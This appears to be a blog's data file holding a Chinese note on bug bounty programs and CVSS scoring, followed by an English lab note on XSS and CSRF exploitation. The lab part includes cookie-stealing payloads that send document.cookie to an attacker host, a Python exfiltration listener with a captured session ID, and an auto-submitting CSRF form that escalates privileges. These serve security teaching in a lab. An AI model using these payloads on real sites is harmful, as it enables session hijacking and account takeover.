<ul><li>Causes all instances to gain ROOT permissions</li></ul>
<ul><li>Desktop application remote code execution</li></ul>
<ul><li>Expose other account full names via API Explorer</li></ul>
<ul><li>Employees without permission can modify store customer email addresses</li></ul>
<ul><li>XSS triggered when signing in with Google</li></ul>
<ul><li>Recruitment Page XSS</li></ul>
<p>The purpose of these examples is not to make you memorize the title, but to make you understand:<strong>The title of a good report is usually very intuitive, allowing you to see at a glance the type of vulnerability, who was affected, and the core impact.</strong></p>`,
      zh: String.raw`<h2>理论</h2>
<h3>漏洞赏金计划</h3>
<p>正如本模块总结中提到的，漏洞赏金计划通常被视为一种众包式安全机制：个人通过发现并报告软件漏洞，获得认可与报酬。</p>
<p>不过，漏洞赏金计划的意义远不止“找漏洞拿奖金”这么简单。漏洞赏金计划（Bug Bounty Program），也常被称为漏洞奖励计划（Vulnerability Rewards Program, VRP），本质上是一种<strong>持续、主动</strong>的安全测试机制。它用于补充企业内部的代码审计和渗透测试，并进一步完善组织整体的漏洞管理策略。也就是说，它不是一次性的安全检查，而是把外部研究人员的持续测试纳入企业长期安全体系中。</p>
<p>对其漏洞赏金平台的描述很贴切：<strong>“持续测试，持续防护（Continuous testing, constant protection）”</strong>。这说明漏洞赏金并不是开发结束后的附加项目，而是可以无缝融入企业现有软件开发生命周期中的安全环节。换句话说，它让安全测试从阶段性行为，变成一种长期运行的机制。</p>
<hr/>
<h3>漏洞赏金计划类型</h3>
<p>漏洞赏金计划主要可以分为<strong>私有计划</strong>和<strong>公开计划</strong>两类。</p>
<p>私有漏洞赏金计划不会向公众开放。研究人员只有在收到特定邀请后，才能参与这类项目。大多数漏洞赏金计划最初都会以私有形式启动，因为这样企业可以先逐步适应接收漏洞报告、进行分类和处理的流程，等机制成熟后再开放给更广泛的安全社区。通常，研究人员能否获得私有项目邀请，与其过往成绩、有效漏洞提交的稳定性以及是否有违规记录密切相关。像 HackerOne 这样的平台，就会根据一系列标准发出邀请。有些项目甚至还会要求参与者通过背景调查。</p>
<p>公开漏洞赏金计划则面向整个黑客社区开放，任何符合条件的研究人员都可以参与测试和报告漏洞。这种模式覆盖面更广，能够借助更多外部研究者的力量发现问题，但对企业的处理能力要求也更高。</p>
<p>除此之外，还有一种<strong>母子计划（Parent/Child Programs）</strong>。这种模式下，母公司和其子公司会共享同一个奖金池以及同一个网络安全团队。若某个子公司启动了自己的漏洞赏金项目，该项目会与母项目关联起来。这个设计便于集团化公司统一管理漏洞处理和奖励发放。</p>
<p>这里还有一个很重要的概念区分：<strong>Bug Bounty Program（BBP）</strong> 和 <strong>Vulnerability Disclosure Program（VDP）</strong> 不能混用。 漏洞披露计划（VDP）只是告诉外部人员：如果你发现了漏洞，应该如何向该组织提交信息。它本身不一定提供奖金。 而漏洞赏金计划（BBP）则更进一步：它不仅鼓励第三方主动去发现并上报漏洞，还会以金钱奖励作为激励。简单说，<strong>VDP 解决“怎么报”，BBP 解决“报了有什么激励”</strong>。两者有联系，但不是一回事。</p>
<hr/>
<h3>漏洞赏金计划行为准则</h3>
<p>漏洞赏金猎人的违规记录会一直被重点考虑，因此，严格遵守每个漏洞赏金项目或平台的行为准则（Code of Conduct）是非常关键的。这不是走形式，也不是“顺手瞄一眼就行”的东西。恰恰相反，花时间认真阅读这些规则，会直接影响你能不能高效、安全、专业地提交报告。</p>
<p>行为准则不仅规定了参与者应该如何行动，也会帮助研究人员更清楚地理解项目方的期望，从而减少误解、避免踩线，并提升漏洞报告的质量。很多新手容易只盯着技术细节，忽视项目规则，结果漏洞没问题，流程上却翻车，这就很亏。</p>
<p>如果想成为成熟、长期可持续的漏洞赏金猎人，就必须在<strong>专业性</strong>和<strong>技术能力</strong>之间取得平衡。不是只会挖洞就够了，也不是只会写礼貌邮件就行，二者缺一不可。文中也建议读者去查看 HackerOne 的行为准则，以熟悉这类文档的写法和要求。这个建议很实际，因为很多平台的规则虽然措辞不同，但底层逻辑都差不多：别乱搞，别越界，按规范来。</p>
<hr/>
<h3>漏洞赏金计划结构</h3>
<p>接下来，文章开始说明一个漏洞赏金计划通常长什么样。它建议读者去 HackerOne 的项目列表中查看具体实例，比如 Alibaba BBP 和 Amazon Vulnerability Research Program，并重点阅读其中的 <strong>Policy</strong> 部分。</p>
<p>按照 HackerOne 的说法，Policy 部分是组织用来向黑客说明项目细节的地方。企业通常会在这里发布漏洞披露政策，告诉研究人员：他们希望怎样接收漏洞信息、哪些产品或服务允许测试、哪些内容属于测试范围。通常，这些范围会通过域名、IP 范围、Web 应用，或者特定的 App Store / Play Store 应用来界定。</p>
<p>一个典型的漏洞赏金计划通常会包含以下要素： 它会说明厂商响应的 SLA，也就是厂商会在什么时间、以什么方式回应报告；会说明研究测试所需的访问方式，比如如何创建测试账号；会规定资格标准，例如“必须是第一个提交该漏洞的人”才能拿到奖励；会提供负责任披露政策，用来约定公开时间线和协调流程，以保障用户安全；还会定义参与规则（Rules of Engagement）、测试范围（Scope）、范围外内容（Out of Scope）、报告格式（Reporting Format）、奖励机制（Rewards）、安全港条款（Safe Harbor）、法律条款（Legal Terms and Conditions）以及联系信息（Contact Information）。</p>
<p>在 HackerOne 上，这些内容通常都包含在每个项目的 Policy 部分里。这里的重点很明确：<strong>一定要仔细看项目说明和政策，不要想当然。</strong> 很多来回扯皮、时间浪费，根本不是因为技术不会，而是因为一开始没把规则看清楚。漏洞赏金里，时间确实很重要，谁先提交、谁提交得更规范，都会影响结果。这个领域有点像打怪抢首杀，但规则比副本机制还烦，不读清楚就容易白忙活。</p>
<hr/>
<h3>寻找漏洞赏金项目</h3>
<p>在寻找合适的漏洞赏金项目方面，文中推荐的一个优秀在线资源是 <strong>HackerOne Directory</strong>。这个目录可以帮助研究人员找到自己感兴趣的漏洞赏金计划，也可以用来查找某些组织的漏洞报告联系方式，以便你在合规、道德的前提下报告自己发现的问题。</p>
<p>也就是说，这个目录不仅适合想“主动找项目做”的人，也适合那些在日常研究中偶然发现某组织漏洞、希望合法上报的人。它既是项目入口，也是负责任披露的一个信息来源。</p>
<hr/>
<h3>总结</h3>
<p>这部分内容的核心意思可以概括为：漏洞赏金计划并不只是“发现漏洞换奖金”的简单机制，而是企业持续安全治理体系中的一个重要组成部分。它可以分为私有和公开两类，有时还存在母子项目结构。与此同时，BBP 和 VDP 必须明确区分，前者带有奖励激励，后者主要是披露通道。</p>
<p>对于参与者来说，真正重要的不只是技术水平，还包括是否理解并遵守项目规则。行为准则、范围、报告要求、法律条款这些内容看起来不刺激，但往往决定你能不能顺利、长期地做下去。最后，像 HackerOne Directory 这样的平台目录，是寻找项目和合法报告入口的重要资源。</p>
<p>如果你要，我下一步可以把这段内容继续整理成<strong>更像考试笔记的版本</strong>，也就是更短、更好背的那种 Markdown。</p>
<h2>如何写好漏洞报告</h2>
<p>这一部分主要讲的是：<strong>一份好的漏洞报告该怎么写，以及为什么要用 CWE 和 CVSS 来描述漏洞。</strong></p>
<p>好的漏洞报告首先要做到<strong>清晰、简洁、可复现</strong>。也就是说，报告不能只是说“这里有漏洞”，而是要让安全团队或分诊团队能够迅速看懂问题、理解影响，并且按照你提供的步骤一步一步复现漏洞。尤其重要的是，报告中必须清楚写出漏洞利用的复现过程，否则哪怕你真的找到高价值漏洞，对方也可能因为无法复现而延迟处理，甚至直接降低优先级。</p>
<p>文中还特别提到，如果你面对的是安全成熟度较低的公司，不能只堆技术术语。你需要把技术问题翻译成更容易理解的业务语言，让对方明白这个漏洞到底会带来什么现实风险。因为很多时候，真正推动修复的不是“这是个 XX 漏洞”，而是“这个漏洞会导致客户数据泄露、后台被接管、业务中断”。</p>
<hr/>
<h3>好的漏洞报告应包含什么</h3>
<p>一份高质量的漏洞报告通常包含以下核心元素，不过这些元素的顺序不一定固定。</p>
<p>首先是<strong>漏洞标题</strong>。标题要尽量明确，最好直接体现出漏洞类型、受影响的位置以及影响。例如受影响的域名、参数、接口或功能点。标题不是装饰品，而是别人第一眼判断问题性质的入口。</p>
<p>然后是 <strong>CWE 和 CVSS 分数</strong>。CWE 用来说明这属于哪一类安全弱点，CVSS 用来量化漏洞严重程度。它们的价值在于让漏洞特征和风险等级能够用标准化方式表达，而不是只靠主观描述。</p>
<p>接着是<strong>漏洞描述</strong>。这一部分的重点是说明漏洞为什么会存在，也就是帮助对方理解根因，而不只是现象。</p>
<p>之后是<strong>POC（概念验证 / 复现步骤）</strong>。这是报告中最关键的部分之一，需要清楚、简洁、可重复。别人照着你的步骤操作，应该能稳定看到漏洞效果。写得像谜语人一样，那就很容易把事情搞成技术相声。</p>
<p>然后是<strong>影响分析</strong>。这里不只是简单写“可能有风险”，而是要说明攻击者在完全利用该漏洞后，究竟能做到什么，造成什么业务后果，最大损害是什么。好的影响描述通常既包含技术影响，也包含业务影响。</p>
<p>最后是<strong>修复建议</strong>。文中说这在漏洞赏金项目里是可选项，不一定强制要求，但如果你能提供合理的修复建议，整体报告质量会更高，也更容易体现专业性。</p>
<p>总体来说，<strong>可读性强、格式清晰的报告能大幅减少复现时间和分诊时间</strong>。这很关键，因为漏洞赏金场景里，时间就是货币，报告越容易处理，你越容易被高效确认。</p>
<hr/>
<h3>为什么要使用 CWE 与 CVSS</h3>
<p>这一部分解释了：为什么漏洞报告里经常要写 CWE 和 CVSS。</p>
<h4>是什么</h4>
<p>CWE，全称 <strong>Common Weakness Enumeration</strong>，即<strong>通用弱点枚举</strong>。MITRE 把它定义为一个社区共同维护的软件和硬件弱点类型列表。它相当于一种统一语言，用于描述漏洞背后的弱点本质，比如输入验证不当、访问控制缺失、命令注入之类。</p>
<p>它的作用有几个： 一是方便大家统一交流，不同公司、平台、研究人员都能用同样的标签理解问题； 二是作为安全工具的参考标准； 三是帮助进行漏洞识别、缓解和预防。</p>
<p>文中还提醒：如果你面对的是<strong>漏洞链</strong>，那应该优先选择与<strong>初始漏洞</strong>相关的 CWE，而不是选后续效果对应的那个。这个点很细，但很实用。</p>
<h4>是什么</h4>
<p>CVSS，全称 <strong>Common Vulnerability Scoring System</strong>，即<strong>通用漏洞评分系统</strong>。它是全世界很多组织都在使用的标准，用来衡量漏洞严重程度。</p>
<p>简单说，CWE 更像是在回答： <strong>“这是什么类型的问题？”</strong></p>
<p>而 CVSS 更像是在回答： <strong>“这个问题有多严重？”</strong></p>
<p>所以这两个东西经常一起出现，一个负责分类，一个负责定级。</p>
<hr/>
<h3>使用 CVSS 计算器</h3>
<p>这一部分开始讲 <strong>CVSS v3.1 计算器</strong> 怎么用，并说明在这里主要关注 <strong>Base Score（基础分）</strong>。</p>
<p>的各个维度，本质上是在评估：漏洞是怎么被利用的、利用难不难、需要什么权限、影响大不大。</p>
<h4>1. Attack Vector（攻击向量）</h4>
<p>这个指标表示攻击者通过什么方式来利用漏洞。</p>
<ul><li><strong>Network (N)</strong>：通过网络远程利用。</li></ul>
<ul><li><strong>Adjacent (A)</strong>：必须与目标处于同一物理或逻辑网络中，例如同一局域网或同一 VPN。</li></ul>
<ul><li><strong>Local (L)</strong>：必须本地访问目标系统，或者通过 SSH 这类方式登录后利用。</li></ul>
<ul><li><strong>Physical (P)</strong>：需要物理接触设备。</li></ul>
<p>题目里问的那个答案就是这里的 <strong>Adjacent (A)</strong>。</p>
<h4>2. Attack Complexity（攻击复杂度）</h4>
<p>表示成功利用漏洞前，是否还需要满足额外条件。</p>
<ul><li><strong>Low (L)</strong>：基本不需要额外准备，攻击者可以比较直接地反复利用。</li></ul>
<ul><li><strong>High (H)</strong>：需要特殊准备、额外条件或更多信息收集。</li></ul>
<h4>3. Privileges Required（所需权限）</h4>
<p>表示攻击者在利用漏洞前必须拥有什么级别的权限。</p>
<ul><li><strong>None (N)</strong>：无需任何登录或特殊权限。</li></ul>
<ul><li><strong>Low (L)</strong>：需要普通用户权限。</li></ul>
<ul><li><strong>High (H)</strong>：需要管理员级别权限。</li></ul>
<h4>4. User Interaction（用户交互）</h4>
<p>表示漏洞利用时，是否必须依赖受害者做某些动作。</p>
<ul><li><strong>None (N)</strong>：攻击者自己就能完成利用。</li></ul>
<ul><li><strong>Required (R)</strong>：必须用户点击、访问、打开某内容后才能触发。</li></ul>
<h4>5. Scope（影响范围）</h4>
<p>表示漏洞利用后，影响是否超出原本的安全边界。</p>
<ul><li><strong>Unchanged (U)</strong>：影响只局限于当前组件或同一安全域内资源。</li></ul>
<ul><li><strong>Changed (C)</strong>：利用一个组件的漏洞，却能影响另一个组件，例如服务器上的漏洞影响到了浏览器。</li></ul>
<h4>6. Confidentiality（机密性）</h4>
<p>表示漏洞利用后，对信息保密性的影响。</p>
<ul><li><strong>None (N)</strong>：没有影响。</li></ul>
<ul><li><strong>Low (L)</strong>：有部分信息泄露，但攻击者不能完全控制获取什么。</li></ul>
<ul><li><strong>High (H)</strong>：严重泄露，攻击者能获取大量甚至完全控制可读信息。</li></ul>
<h4>7. Integrity（完整性）</h4>
<p>表示漏洞利用后，对数据可信度和准确性的影响。</p>
<ul><li><strong>None (N)</strong>：没有影响。</li></ul>
<ul><li><strong>Low (L)</strong>：只能有限修改数据，影响较轻。</li></ul>
<ul><li><strong>High (H)</strong>：可以修改关键数据或全部数据，影响严重。</li></ul>
<h4>8. Availability（可用性）</h4>
<p>表示漏洞利用后，对系统可用性的影响。</p>
<ul><li><strong>None (N)</strong>：没有影响。</li></ul>
<ul><li><strong>Low (L)</strong>：服务性能下降，但不能完全拒绝服务。</li></ul>
<ul><li><strong>High (H)</strong>：服务严重受影响甚至中断。</li></ul>
<hr/>
<h3>示例</h3>
<p>文中给了两个例子，说明如何使用 CVSS 3.1 对漏洞做严重性分析。</p>
<h4>例子 1：Cisco ASA 缓冲区溢出漏洞</h4>
<p>这个漏洞的 CVSS 3.1 分数是 <strong>9.8（Critical，严重）</strong>。 因为它可以通过网络远程利用，不需要认证，也不需要用户交互，攻击复杂度低，最终还能让攻击者获得反向 shell。于是它在机密性、完整性、可用性三个维度上都被评为 <strong>High</strong>。这类漏洞基本上就是“远程接管设备”的典型高危漏洞，分高得很合理，没什么悬念。</p>
<h4>例子 2：管理员后台的存储型 XSS</h4>
<p>这个漏洞的 CVSS 3.1 分数是 <strong>5.5（Medium，中危）</strong>。 虽然攻击可以通过网络发起，复杂度也不高，但前提是攻击者本身必须已经具备管理员权限，也就是说 <strong>Privileges Required = High</strong>。此外，这个漏洞的影响主要体现在 DOM 访问和一定程度上的应用完整性影响，不能直接导致服务不可用，因此 Confidentiality 和 Integrity 是 <strong>Low</strong>，Availability 是 <strong>None</strong>。 这说明 CVSS 打分不是只看漏洞名字，<strong>不是看到 XSS 就自动高危</strong>，而是要看具体利用条件和影响范围。</p>
<hr/>
<h3>优秀报告示例</h3>
<p>最后这一部分列举了一些 HackerOne 选出的优秀漏洞报告案例，比如：</p>
<ul><li>导致所有实例获得 ROOT 权限</li></ul>
<ul><li>桌面应用远程代码执行</li></ul>
<ul><li>通过 API Explorer 暴露其他账户全名</li></ul>
<ul><li>无权限员工可以修改商店客户邮箱</li></ul>
<ul><li>使用 Google 登录时触发 XSS</li></ul>
<ul><li>招聘页面 XSS</li></ul>
<p>这些例子的意义不是让你背标题，而是让你理解：<strong>好报告的标题通常都非常直观，能一眼看出漏洞类型、受影响对象和核心影响。</strong></p>`
    }
  },
  {
    id: "advanced-xss-csrf",
    href: "posts/web/advanced-xss-csrf.html",
    title: {
      "en": "Advanced XSS and CSRF Exploitation",
      "zh": "高级 XSS 与 CSRF 利用"
    },
    category: "web",
    categoryLabel: {
      "en": "Web",
      "zh": "Web"
    },
    description: {
      "en": "System sorting out XSS, CSRF, same-origin policy, CORS, CORS misconfiguration and CSRF Token bypass.",
      "zh": "系统整理 XSS、CSRF、同源策略、CORS、CORS 错误配置与 CSRF Token 绕过。"
    },
    date: "2026-05-07",
    content: {
      "en": "A structured learning note about XSS, CSRF, the Same-Origin Policy, CORS, CORS misconfiguration, and CSRF token bypasses.",
      "zh": "系统整理 XSS、CSRF、同源策略、CORS、CORS 错误配置与 CSRF Token 绕过。"
    },
    code: "XSS -> authenticated browser action -> data access or CSRF bypass",
    contentHtml: {
      en: String.raw`<h2>Vulnerability introduction</h2>
<p><strong>XSS (Cross-Site Scripting)</strong>It is a common web security vulnerability. Its essence is:</p>
<blockquote>Attackers inject malicious scripts (usually JavaScript) into web pages so that other users can execute the scripts when they browse the page.</blockquote>
<p>In other words:</p>
<ul><li>The attack code is "stored" in the web page or request</li><li>The browser treats it as normal page content and executes it.</li><li>eventually<strong>Execute the attacker's code in the victim's browser</strong></li></ul>
<div class="post-table-wrap"><table><thead><tr><th>Type</th><th>Description</th></tr></thead><tbody><tr><td><code>Stored (Persistent) XSS</code></td><td>The most severe type of XSS is an XSS attack that occurs when user input is stored in a backend database and then displayed upon retrieval (for example, in a post or comment).</td></tr><tr><td><code>Reflected (Non-Persistent) XSS</code></td><td>This occurs when user input has been processed by the backend server and displayed on the page, but has not yet been stored (for example, search results or error messages).</td></tr><tr><td><br/><code>DOM-based XSS</code></td><td>Another type of non-persistent XSS occurs when user input is displayed directly in the browser and processed entirely on the client side without reaching the backend server (for example, via client HTTP parameters or anchor tags).</td></tr></tbody></table></div>
<pre><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
<ul><li><code>window.origin</code> Displayed is the protocol + domain name + port of the current site</li><li><code>document.cookie</code> Displays cookies that can be read by the current page</li></ul>
<p><strong>DOM XSS</strong></p>
<p>What is Source and Sink in<strong>DOM-based XSS</strong>Here, you can understand the whole process into two steps:</p>
<ol><li><strong>Source</strong>: Where does the user-controllable data enter the page script?</li><li><strong>Sink</strong>: Where is this data eventually written, and whether it will be parsed and executed by the browser as code/HTML</li></ol>
<p>In other words:</p>
<blockquote><strong>Source is responsible for "coming in" and Sink is responsible for "landing"</strong></blockquote>
<p>As long as the following chain is met, DOM XSS may be formed: User controllable input → Source reading → JavaScript processing → Sink writing DOM → Browser parsing and executing malicious content</p>
<pre><code class="language-JavaScript"># When the entire page DOM is loaded, the code inside is executed. Equivalent to: $(document).ready(function () {
$(function () {
	# Bind a click event to the element with the id of add,
    $("#add").click(function () {
	    # \`$("#task")\`, select the element with id \`task\`
	    # \`.val()\`, take the current value of this input box.
	    # \`.length &gt; 0\`, determine whether the input content is non-empty.
        if ($("#task").val().length &gt; 0) {
	        
	        # Modify the current page URL. If the input is test, change it to \`http://example.com/#task=test\`
            window.location.href = "#task=" + $("#task").val();
            var pos = document.URL.indexOf("task=");
            var task = document.URL.substring(pos + 5, document.URL.length);
            
            # \`.innerHTML =...\`, writes the content on the right into this element as HTML.
            # decodeURIComponent(task), decodes URL encoded content.   %3C -&gt; &lt;
            document.getElementById("todo").innerHTML = "&lt;b&gt;Next Task:&lt;/b&gt; " + decodeURIComponent(task);
        }
    });
});
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
if (pos &gt; 0) {
    document.getElementById("todo").innerHTML = "&lt;b&gt;Next Task:&lt;/b&gt; " + decodeURIComponent(task);
}</code></pre>
<pre><code>...PAYLOAD... &lt;!--</code></pre>
<p><strong>session hijacking</strong></p>
<pre><code>document.location='http://OUR_IP/index.php?c='+document.cookie; 
new Image().src='http://OUR_IP/index.php?c='+document.cookie;</code></pre>
<pre><code>Results for &amp;quot;&lt;span class="page-description search-term"&gt;11111&lt;/span&gt;&amp;quot;</code></pre>
<ul><li><code>&amp;quot;</code> Is an HTML entity, representing English double quotes <code>"</code>.</li></ul>
<p>payload <code>&lt;/span&gt;&lt;img src=x onerror=alert(1)&gt;</code> is encoded to <code>&amp;lt;/span&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt</code>, website pair <code>&lt;</code> and <code>&gt;</code> HTML entity encoding is done, so it will not be executed.</p>
<pre><code>Results for &amp;quot;&lt;span class="page-description search-term"&gt;&amp;lt;/span&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/span&gt;&amp;quot;</code></pre>
<h2>Introduction to advanced CSRF and XSS exploits</h2>
<p>Cross-site request forgery (CSRF) and cross-site scripting (XSS)</p>
<p><strong>Real-world applications of modern CSRF and XSS attacks</strong> As we will discuss in this module, many security policies and safeguards in modern web browsers limit or prevent basic exploitation of CSRF vulnerabilities. Examples include the Same Origin Policy, Cross-Origin Resource Sharing (CORS), and SameSite Cookies, which we will explore further in subsequent chapters.</p>
<p>As a result, pure CSRF exploits are becoming increasingly rare in the real world. However, if we discover an XSS vulnerability, we can combine the exploits of XSS and CSRF vulnerabilities, resulting in a powerful tool that allows us to attack the vulnerable web application itself, and possibly even other web applications within the victim's internal network.</p>
<p>To exploit CSRF and XSS vulnerabilities and interact with a vulnerable web application, we can use<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" rel="noreferrer" target="_blank">XMLHttpRequest</a>object or more modern<a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API" rel="noreferrer" target="_blank">Fetch API</a>. We can use these two methods to make HTTP requests from JavaScript code and specify HTTP parameters such as request method, HTTP headers, or request body.</p>
<p>For example, we can <code>XMLHttpRequest</code> by calling <code>send_post()</code> Specify URL when function <code>xhr.open</code>, use <code>set_HTTP_headers()</code> Function sets HTTP headers <code>xhr.setRequestHeader</code> and in calling <code>send_post_body()</code> Specify the request body parameters when using the function to use this object to send a POST request.<code>xhr.send</code>: </p>
<pre><code class="language-js">var xhr = new XMLHttpRequest(); 
xhr.open('POST', 'http://exfiltrate.htb/', false); 
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 
xhr.send('param1=hello&amp;param2=world');</code></pre>
<p>On the other hand, we can use <code>Fetch API</code> Send the same request as follows:</p>
<pre><code class="language-js">const response = await fetch('http://exfiltrate.htb/', {
    method: "POST",
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'param1=hello&amp;param2=world',
  });</code></pre>
<p>This function <code>fetch</code> The first parameter needs to be passed in the URL. We can put all other request parameters in an object and pass it in as the second parameter.</p>
<p><strong>lab environment</strong>The laboratory consists of the following parts:</p>
<ul><li>An exploit development server <code>https://exploitserver.htb</code></li><li>We are evaluating a vulnerable web application on a given virtual host. For example:<code>https://vulnerablesite.htb</code></li><li>Additionally, we will be hosting an HTTPS web server on our own system so that we can exfiltrate data.</li></ul>
<p><strong>Exploit Development Server</strong></p>
<p>We can use the vulnerability development server to <code>exploitserver.htb</code> Develop a CSRF or XSS payload and deliver the exploit to the victim. The Exploit Development Server enables us to develop custom exploits targeting specific vulnerabilities found in target web applications. Suppose, for a proof-of-concept XSS in the target web application, we want to trigger an alert box:</p>
<img alt="Pasted image 20260415041746" src="assets/posts/advanced-xss-csrf/Pasted image 20260415041746.png"/>
<p>We can view the exploit we developed by accessing this endpoint <code>/exploit</code>. Doing so will trigger an alert popup:</p>
<img alt="Pasted image 20260415041800" src="assets/posts/advanced-xss-csrf/Pasted image 20260415041800.png"/>
<p>Finally, we can deliver the exploit to the victim by accessing the target endpoint <code>/deliver</code>, which will cause the victim to trigger the attack payload we developed by accessing the target address <code>https://exploitserver.htb/exploit</code>. This is useful in CSRF attacks, as the victim must actively access the attack payload to trigger the exploit code. This module focuses on exploit development rather than exploit delivery methods. Delivering the attack payload to the victim forces the exploit to be triggered. In the real world, there are multiple exploit delivery methods, including sending a link to the victim via email or any instant messaging service.</p>
<p>We can also exploit exploit servers to develop XSS attack payloads. However, in this case we do not need to deliver the exploit directly to the victim as the attack payload is propagated via an XSS attack payload injected on the vulnerable site.</p>
<p><strong>HTTPS data leak server</strong> In this module, all experiments are run on an HTTPS-enabled web server. Modern web browsers implement security measures that prevent HTTPS websites from loading resources over unencrypted HTTP connections. To avoid problems, we will use Python to set up a web server that accepts HTTPS requests. First, we need to generate a new self-signed certificate for the server to support encrypted communication. We can accomplish this using the following command. The details of the certificate can be specified arbitrarily:</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes</code></pre>
<p>Next, we can create a simple Python HTTPS server that logs incoming requests to stdout and saves them to a file <code>server.py</code>. We need to provide <code>OPTIONS</code> Request to configure CORS to allow JavaScript request body for POST requests:</p>
<pre><code class="language-python">from http import server
import ssl

class CustomRequestHandler(server.SimpleHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        super().do_GET()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)

        if body:
            self.log_message("[i] POST body: %s", body.decode("utf-8", errors="replace"))

        self.send_response(200)
        self.end_headers()

print("Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...")
httpd = server.HTTPServer(('0.0.0.0', 4443), CustomRequestHandler)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='./server.pem')
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()</code></pre>
<p>After that we can run the server by executing the file <code>server.py</code>. To test the server, let's <code>curl</code> Send a quick test request in a second terminal:</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ curl -vk https://127.0.0.1:4443/get?Hello=World
Chenduoduo@htb[/htb]$ curl -vk https://127.0.0.1:4443/post?Hello=World -d 'test=123'</code></pre>
<p>We can see that the request URL, all GET parameters, and all POST parameters are printed in the terminal where the web server is running. For the purposes of this module, this is sufficient for data breach needs:</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py

Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
127.0.0.1 - - [30/Nov/2025 11:18:12] code 404, message File not found
127.0.0.1 - - [30/Nov/2025 11:18:12] "GET /get?Hello=World HTTP/1.1" 404 -
127.0.0.1 - - [30/Nov/2025 11:18:29] [i] POST body: test=123
127.0.0.1 - - [30/Nov/2025 11:18:29] "POST /post?Hello=World HTTP/1.1" 200 -</code></pre>
<p>Although certificate verification has been disabled in all lab environments for this module, the use of self-signed certificates should still be avoided in real applications, as modern browsers may refuse to load resources over insecure connections due to improper HTTPS configuration. For more details about HTTPS, see the "HTTPS/TLS Attacks" module.</p>
<pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>Afterwards, we can create a cookie-stealing payload on the attack server, such as the following code. To steal cookies we can use an HTTPS server running on the system:</p>
<pre><code class="language-js">windows.location = "https://10.10.14.45:4443/cookiestealer?=" + document.cookie;</code></pre>
<p>After saving the exploit, we can confirm that the program has been saved by accessing the endpoint <code>/exploit</code>: </p>
<img alt="Pasted image 20260415043149" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043149.png"/>
<p>Finally, we have to wait for the admin user to access the guestbook. The injected XSS payload causes the administrator's browser to load a payload from the attack server, exfiltrating the administrator's user's cookies into our system:</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py 

10.129.233.62 - - [31/Dec/2024 13:37:36] code 404, message File not found
10.129.233.62 - - [31/Dec/2024 13:37:36] "GET /cookiestealer?c=PHPSESSID=tiitsevk7pns4kmrcmjecm9qq6 HTTP/1.1" 404</code></pre>
<p><strong>CSRF</strong></p>
<img alt="Pasted image 20260415043309" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043309.png"/>
<p>However, we can see that we only have <code>user</code> these permissions. here is one <code>promote</code> button. If we click on it, the web application will prompt us that only admin users can promote other users. However, we can see that the promotion operation is achieved with the following request:</p>
<img alt="Pasted image 20260415043318" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043318.png"/>
<p>Specifically, this endpoint lacked CSRF protection, which allowed us to launch a CSRF attack that would force an administrator to escalate the privileges of our users. To do this, we need to create an HTML form corresponding to the promotion request:</p>
<pre><code class="language-html">&lt;html&gt;
  &lt;body&gt;
    &lt;form method="GET" action="https://csrf.labintro.htb/profile.php"&gt;
      &lt;input type="hidden" name="promote" value="htb-stdnt" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>Since we don't want the attack to require additional user interaction, we'll add JavaScript code to automatically submit the form once the page has finished loading:</p>
<pre><code class="language-html">&lt;script&gt;     
	document.forms[0].submit(); 
&lt;/script&gt;</code></pre>
<p>Combining these two parts results in the following payload, which we will save in the exploit server:</p>
<pre><code class="language-html">&lt;html&gt;
  &lt;body&gt;
    &lt;form method="GET" action="https://csrf.labintro.htb/profile.php"&gt;
      &lt;input type="hidden" name="promote" value="htb-stdnt" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p><code>View Exploit</code> We can test our exploit by logging into the vulnerable application and clicking a link. This will send a request to a server <code>https://exploitserver.htb/exploit</code>, the server returns our saved payload. The payload automatically submits a form, making a cross-origin request to the vulnerable web application. However, since we are not administrators, the privilege escalation fails:</p>
<img alt="Pasted image 20260415043428" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043428.png"/>
<p>However, this confirms that our CSRF payload successfully sends an HTTP request to escalate user privileges. To perform the attack we can pass the payload to the victim and select the current virtual host <code>csrf.labintro.htb</code>. This will cause the victim to visit a page <code>https://exploitserver.htb/exploit</code>. After waiting a few seconds and refreshing the page, we will have administrator rights:</p>
<img alt="Pasted image 20260415043442" src="assets/posts/advanced-xss-csrf/Pasted image 20260415043442.png"/>
<h2>Same Origin Policy and CORS</h2>
<h3>Same origin policy</h3>
